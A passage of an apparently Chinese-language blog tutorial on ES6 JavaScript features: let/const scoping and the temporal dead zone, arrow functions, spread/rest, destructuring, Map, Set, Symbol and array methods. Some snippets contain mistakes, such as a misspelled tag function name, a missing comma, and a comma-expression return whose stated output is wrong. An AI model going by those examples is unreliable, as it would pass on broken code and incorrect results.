class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">a[i] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">5</span>](); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><p>使用let，声明的变量仅在块级作用域内有效，最后输出的是5。</p><p>2、let不存在变量提升：let不像var那样会发生变量提升，所以，变量一定要在声明后使用，否则报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">console.log(i); // 输出：undefined</span><br><span class="line">console.log(j); // 报错</span><br><span class="line">var i = 5;</span><br><span class="line">let j = 10;</span><br></pre></td></tr></table></figure><p>3、暂时性死区：</p><p>只要块级作用域存在let命令，它所声明的变量就绑定到这个区域，不再受外部的影响。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i= <span class="number">6</span>;</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">5</span>) &#123;</span><br><span class="line">i = <span class="number">3</span>; <span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ES6明确规定，若块作用域中存在let和const命令，则它们声明的变量，从一开始就形成了封闭作用域，凡是在声明之前就使用这些变量，就会报错。</p><p>在代码块内，使用let命令声明变量之前，该变量都是不可用的（不可赋值，不可访问等），这称为“暂时性死区”。</p><p>暂时性死区使得typeof操作不一定安全，所以在let声明之前，使用typeof操作符会报错。而在let出现之前，typeof是百分之百安全的，永远不会被报错，即使变量没有被声明，typeof也会返回undefined。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">alert(<span class="keyword">typeof</span> x); <span class="comment">// 报错</span></span><br><span class="line">alert(<span class="keyword">typeof</span> y); <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暂时性死区的本质：只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量。</p><p>ES6规定暂时性死区和let、const语句不出现变量提升，主要是为了减少运行时错误，防止变量在声明前就使用该变量，从而导致意料之外的错误。这类错误在ES5中很常见。</p><p>4、不允许重复声明</p><p>let不允许在相同作用域内，重复声明同一个变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">var</span> i= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> i = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> i= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> i = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能在函数内部重新声明参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123; <span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123; <span class="comment">// 不报错</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">let</span> arg;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ES6的const命令"><a href="#ES6的const命令" class="headerlink" title="ES6的const命令"></a>ES6的const命令</h2><p>const声明一个只读的常量，一旦声明，常量的值就不能改变，这意味着，const一旦声明常量，就必须立即初始化，不能等到之后再赋值。因此，改变常量和只声明不赋初始值都会报错。</p><p>const的作用域与let命令相同，只在声明所在的块级作用域内有效。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> i = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>const声明的常量也不提升，同时存在暂时性死区，只能在声明的位置后面使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">const</span> i = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>const声明的常量，也和let一样不可重复声明。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> j = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> i =<span class="number">6</span>; <span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">const</span> j = <span class="number">11</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>对于复合类型的常量，常量名不指向数据，而是指向数据所在的地址。const命令只是保证常量名指向的地址不变，并不保证该地址的数据不变，也就是说，将对象常量指向另一个地址会报错，但对象本身是可变的，可以为其添加，修改属性，因此将一个对象声明为常量必须十分小心。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line">obj.name = “Alice”;</span><br><span class="line">obj = &#123;&#125;; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>将一个数组声明为常量，该数组本身是可写的，但是若将另一个数组赋值给该数组，会报错。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [];</span><br><span class="line">arr.push(<span class="number">1</span>);</span><br><span class="line">arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>转载自<a href="https://blog.csdn.net/zhouziyu2011/article/details/68067609" target="_blank" rel="noopener">https://blog.csdn.net/zhouziyu2011/article/details/68067609</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不用var，主用const，配合let</span><br><span class="line">主用const的好处是用于判断变量是否需要更改</span><br></pre></td></tr></table></figure><hr><ul><li><strong>箭头函数</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不需要 function 关键字来创建函数</span></span><br><span class="line"><span class="comment">//省略 return 关键字</span></span><br><span class="line"><span class="comment">//继承当前上下文的 this 关键字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map((<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;  <span class="comment">//map方法返回一个由原数组中的每个元素调用指定方法后的返回值组成的新数组。</span></span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">1</span>;</span><br><span class="line">&#125;).bind(<span class="keyword">this</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//array.map(function() &#123;&#125;, this) 的作用实际上和 array.map(function() &#123;&#125;.bind(this)) 是一样的。map的第二个参数就是给第一个参数bind一个对象。</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 使用箭头函数</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="function"><span class="params">x</span> =&gt;</span> x + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>函数默认参数值</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES6之前，当未传入参数时，text = 'default'；</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printText</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    text = text || <span class="string">'default'</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(text);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6；</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printText</span>(<span class="params">text = <span class="string">'default'</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(text);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有多个参数时，带默认值的要放到最后</span></span><br></pre></td></tr></table></figure><ul><li><strong>扩展运算符(spread)和剩余运算符(rest)，即…的含义</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//扩展运算符(spread)   数组化为参数,功能是把数组或类数组对象展开成一系列用逗号隔开的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.构造数组</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="string">'aa'</span>,<span class="string">'bb'</span>,<span class="string">'cc'</span>];</span><br><span class="line"><span class="keyword">var</span> arrs = [...arr1, ...arr2];</span><br><span class="line"><span class="built_in">console</span>.log(arrs); <span class="comment">// ['a','b','c','aa','bb','cc']</span></span><br><span class="line"><span class="comment">//2.解析数组</span></span><br><span class="line"><span class="keyword">var</span> son1,son2;</span><br><span class="line">[son1, ...son2] = arr1</span><br><span class="line"><span class="built_in">console</span>.log(son1);  <span class="comment">// 'a'</span></span><br><span class="line"><span class="built_in">console</span>.log(son2);  <span class="comment">//['b','c']</span></span><br><span class="line"><span class="comment">//3.参数赋值</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">const</span> maxNum = <span class="built_in">Math</span>.max(...arr); <span class="comment">// 返回5。max函数不接受数组只接受数列</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//剩余运算符(rest)     参数转化为数组,把逗号隔开的值序列组合成一个数组</span></span><br><span class="line"><span class="comment">//1.所有参数可由一个变量统一接收</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(args);</span><br><span class="line">&#125;</span><br><span class="line">foo( <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>); <span class="comment">// [1, 2, 3, 4, 5]</span></span><br><span class="line">foo( <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>); <span class="comment">// [a,b,c]</span></span><br></pre></td></tr></table></figure><ul><li><strong>对象和数组解构</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.对象</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">2</span>, <span class="attr">z</span>: <span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> &#123;x, y, z&#125; = obj; <span class="comment">// x = 1, y = 2, z = 3</span></span><br><span class="line"><span class="comment">//还可赋值a,b,c</span></span><br><span class="line"><span class="keyword">const</span> &#123;<span class="attr">x</span>: a, <span class="attr">y</span>: b, <span class="attr">z</span>: c&#125; = obj; <span class="comment">// a = 1, b = 2, c = 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.数组</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"><span class="keyword">const</span> [a, b] = arr;</span><br><span class="line"><span class="built_in">console</span>.log(a, b);  <span class="comment">// 1, 2，按顺序自动获取</span></span><br><span class="line"><span class="keyword">const</span> [a, b,,, c] = arr;</span><br><span class="line"><span class="built_in">console</span>.log(a, b, c);  <span class="comment">// 1, 2, 5  获取指定位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.函数对象参数</span></span><br><span class="line"><span class="keyword">const</span> student = &#123;</span><br><span class="line">  name: <span class="string">'Job'</span>,</span><br><span class="line">  num: <span class="number">001</span>,</span><br><span class="line">  age: <span class="number">18</span>,</span><br><span class="line">  sex: <span class="string">'boy'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> check = <span class="function"><span class="keyword">function</span> <span class="title">half</span>(<span class="params">&#123;num,sex&#125;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (num , sex);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(student); <span class="comment">// 一个object</span></span><br><span class="line"><span class="built_in">console</span>.log(check(student)); <span class="comment">// (001, 'boy')</span></span><br></pre></td></tr></table></figure><ul><li><strong>Map数据结构</strong></li></ul><p>为什么需要Map，因为Object本质上是键值对的集合，Object的键在使用Object.keys输出时都转化为了字符串，如果键为对象则都转化为[object, Object]，但是Map的键不限。</p><p>与Object的区别</p><p>（1）Map 中的键值是有序的，而添加到对象中的键则不是。因此，当对它进行遍历时，Map 对象是按插入的顺序返回键值。</p><p>（2）你可以通过 <code>size</code> 属性直接获取一个 <code>Map</code> 的键值对个数，而 <code>Object</code> 的键值对个数只能手动计算。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Map的结构遍历</span></span><br><span class="line"><span class="comment">// 1. keys()--&gt;将键名都取出来，组成一个可遍历的数据集合</span></span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">    [<span class="number">123</span>,<span class="string">'abc'</span>],</span><br><span class="line">    [<span class="string">'a'</span>,<span class="string">'hahaha'</span>],</span><br><span class="line">    [<span class="number">1</span>&gt;<span class="number">2</span>,<span class="string">'baidu.com'</span>]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> x <span class="keyword">of</span> m.keys())&#123;  <span class="comment">//m.keys =&gt; MapIterator &#123;123, "a", false&#125;  返回容器对象</span></span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;<span class="number">123</span> a <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2. values()  返回键值的遍历器</span></span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">    [<span class="number">123</span>,<span class="string">'abc'</span>],</span><br><span class="line">    [<span class="string">'a'</span>,<span class="string">'hahaha'</span>],</span><br><span class="line">    [<span class="number">1</span>&gt;<span class="number">2</span>,<span class="string">'baidu.com'</span>]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> x <span class="keyword">of</span> m.values())&#123;  <span class="comment">//m.values=&gt;MapIterator &#123;"abc", "hahaha", "baidu.com"&#125;</span></span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;abc hahaha baidu.com</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. entries()  返回所有成员的遍历器</span></span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">    [<span class="number">123</span>,<span class="string">'abc'</span>],</span><br><span class="line">    [<span class="string">'a'</span>,<span class="string">'hahaha'</span>],</span><br><span class="line">    [<span class="number">1</span>&gt;<span class="number">2</span>,<span class="string">'baidu.com'</span>]</span><br><span class="line">]);</span><br><span class="line">m.entries()   <span class="comment">//MapIterator &#123;123 =&gt; "abc", "a" =&gt; "hahaha", false =&gt; "baidu.com"&#125;</span></span><br><span class="line">[...m.entries()] <span class="comment">// [Array(2), Array(2), Array(2)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 扩展运算符,转换为二维数组或一维数组</span></span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">    [<span class="number">123</span>,<span class="string">'abc'</span>],</span><br><span class="line">    [<span class="string">'a'</span>,<span class="string">'hahaha'</span>],</span><br><span class="line">    [<span class="number">1</span>&gt;<span class="number">2</span>,<span class="string">'baidu.com'</span>]</span><br><span class="line">]);</span><br><span class="line"><span class="built_in">console</span>.log([...m]) <span class="comment">//(3) [Array(2), Array(2), Array(2)]</span></span><br><span class="line">[...m.keys()]       <span class="comment">//[123, "a", false]</span></span><br></pre></td></tr></table></figure><ul><li><strong>数组的include方法</strong></li></ul><p>在ES5，Array已经提供了indexOf用来查找某个元素的位置，如果不存在就返回-1，</p><p>缺点：</p><ol><li><p>是它会返回-1和元素的位置来表示是否包含，在定位方面是没问题，就是不够语义化。</p></li><li><p>不能判断是否有NaN的元素。 </p></li></ol><p>ES6提供了Array.includes()函数判断是否包含某一元素，除了不能定位外，解决了indexOf的上述的两个问题。它直接返回true或者false表示是否包含元素，对NaN一样能有有效。 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>)     <span class="comment">// true</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">4</span>)     <span class="comment">// false</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="literal">NaN</span>].includes(<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">3</span>);  <span class="comment">// false  该方法的第二个参数表示搜索的起始位置，默认为0</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">-1</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="带标签的模板字符串"><a href="#带标签的模板字符串" class="headerlink" title="带标签的模板字符串"></a>带标签的模板字符串</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模板字符串前面可以添加标签</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> name = <span class="string">'tom'</span></span><br><span class="line"><span class="keyword">const</span> gender = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTagFunc</span> (<span class="params">strings, name, gender</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(strings, name, gender)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = myTagFuc<span class="string">`hey, <span class="subst">$&#123;name&#125;</span> is a <span class="subst">$&#123;gender&#125;</span>`</span></span><br><span class="line"><span class="built_in">console</span>.log(result)</span><br></pre></td></tr></table></figure><h2 id="对象字面量的增强"><a href="#对象字面量的增强" class="headerlink" title="对象字面量的增强"></a>对象字面量的增强</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bar = <span class="string">'345'</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    foo: <span class="number">123</span></span><br><span class="line">    bar,                 <span class="comment">// bar: bar</span></span><br><span class="line">    method1 () &#123;         <span class="comment">// 省略了 :function</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>)   </span><br><span class="line">&#125;</span><br><span class="line">[<span class="built_in">Math</span>.random()]: <span class="number">123</span> <span class="comment">// 计算属性，加上方括号，可以为一个随机的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="object-assign"><a href="#object-assign" class="headerlink" title="object.assign"></a>object.assign</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> source = &#123;</span><br><span class="line">    a: <span class="number">123</span>,</span><br><span class="line">    b: <span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> target = &#123;</span><br><span class="line">    a: <span class="number">456</span>,</span><br><span class="line">    c: <span class="number">456</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(target,source)</span><br></pre></td></tr></table></figure><h2 id="object-is"><a href="#object-is" class="headerlink" title="object.is"></a>object.is</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0</span> === <span class="number">-0</span> <span class="comment">// true</span></span><br><span class="line"><span class="literal">NaN</span> === <span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">object.is(+<span class="number">0</span>, <span class="number">-0</span>) <span class="comment">//false</span></span><br><span class="line"><span class="built_in">Object</span>.is(<span class="literal">NaN</span>, <span class="literal">NaN</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="Set数据结构"><a href="#Set数据结构" class="headerlink" title="Set数据结构"></a>Set数据结构</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>()</span><br><span class="line">s.add(<span class="number">1</span>).add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s.size)</span><br><span class="line"><span class="built_in">console</span>.log(s.has(<span class="number">100</span>))</span><br><span class="line"><span class="built_in">console</span>.log(s.delete(<span class="number">3</span>))</span><br><span class="line">s.clear()</span><br></pre></td></tr></table></figure><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    [<span class="built_in">Symbol</span>()]: <span class="string">'symbol value'</span>,</span><br><span class="line">    foo: <span class="string">'value'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用for in, Object.keys, JSON.stringify都获取不到</span></span><br></pre></td></tr></table></figure><h2 id="forEach、find、map、filter、reduce、every、some"><a href="#forEach、find、map、filter、reduce、every、some" class="headerlink" title="forEach、find、map、filter、reduce、every、some"></a>forEach、find、map、filter、reduce、every、some</h2><h4 id="1、forEach-没有返回值，只是让数组中的每个元素执行function的操作"><a href="#1、forEach-没有返回值，只是让数组中的每个元素执行function的操作" class="headerlink" title="1、forEach 没有返回值，只是让数组中的每个元素执行function的操作"></a>1、forEach 没有返回值，只是让数组中的每个元素执行function的操作</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item * <span class="number">2</span>);       <span class="comment">//2,4,6,8,10</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="2、find-返回数组中第一个满足条件的元素（查找）"><a href="#2、find-返回数组中第一个满足条件的元素（查找）" class="headerlink" title="2、find 返回数组中第一个满足条件的元素（查找）"></a>2、find 返回数组中第一个满足条件的元素（查找）</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">arr.find(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">3</span>;       <span class="comment">//4</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="3、map-返回一个新数组，数组中的每个元素为调用function的结果"><a href="#3、map-返回一个新数组，数组中的每个元素为调用function的结果" class="headerlink" 